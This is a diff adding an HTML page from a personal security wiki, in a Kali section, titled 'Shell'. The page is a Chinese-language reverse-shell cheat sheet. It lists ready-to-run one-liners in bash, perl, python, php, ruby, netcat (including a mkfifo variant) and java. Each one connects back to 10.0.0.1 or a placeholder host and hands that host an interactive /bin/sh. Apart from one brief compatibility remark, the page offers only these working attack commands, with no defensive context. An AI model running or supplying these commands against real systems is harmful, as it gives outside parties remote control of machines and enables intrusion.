@@ -1,0 +1,71 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>Shell - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#Kali2">Kali2</a>&nbsp;»&nbsp;Shell</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">Shell</div>
+  <div id="content">
+  <h2 id="shell">反弹shell</h2>
+<p>bash版本：</p>
+<div class="hlcode"><pre><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.0.0.1</span><span class="o">/</span><span class="mi">8080</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+
+<p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
+<p>perl版本:</p>
+<div class="hlcode"><pre><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">use</span> <span class="n">Socket</span><span class="p">;</span><span class="err">$</span><span class="n">i</span><span class="o">=</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">;</span><span class="err">$</span><span class="n">p</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">socket</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">PF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="n">getprotobyname</span><span class="p">(</span><span class="s">&quot;tcp&quot;</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">sockaddr_in</span><span class="p">(</span><span class="err">$</span><span class="n">p</span><span class="p">,</span><span class="n">inet_aton</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">)))){</span><span class="n">open</span><span class="p">(</span><span class="n">STDIN</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDOUT</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDERR</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span><span class="n">exec</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);};</span><span class="err">&#39;</span>
+</pre></div>
+
+
+<p>python版本：</p>
+<div class="hlcode"><pre><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">1234</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s">&quot;-i&quot;</span><span class="p">]);</span><span class="err">&#39;</span>
+</pre></div>
+
+
+<p>php版本：</p>
+<div class="hlcode"><pre>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="ni">&amp;3&quot;);</span>&#39;
+</pre></div>
+
+
+<p>ruby版本：</p>
+<div class="hlcode"><pre>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i <span class="err">&lt;&amp;</span>%d &gt;<span class="err">&amp;</span>%d 2&gt;<span class="err">&amp;</span>%d&quot;,f,f,f)&#39;
+</pre></div>
+
+
+<p>nc版本：</p>
+<div class="hlcode"><pre><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="mf">10.0.0.1</span> <span class="mi">1234</span>
+<span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mf">10.0.0.1</span> <span class="mi">1234</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
+<span class="n">nc</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="mi">8888</span><span class="o">|/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">|</span><span class="n">nc</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="mi">9999</span>
+</pre></div>
+
+
+<p>java版本</p>
+<div class="hlcode"><pre>r = Runtime.getRuntime() 
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5<span class="err">&lt;</span>&gt;/dev/tcp/10.0.0.1/2002;cat <span class="err">&lt;&amp;</span>5 | while read line; do \$line 2&gt;<span class="err">&amp;</span>5 &gt;<span class="ni">&amp;5;</span> done&quot;] as String[]) 
+p.waitFor()
+</pre></div>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
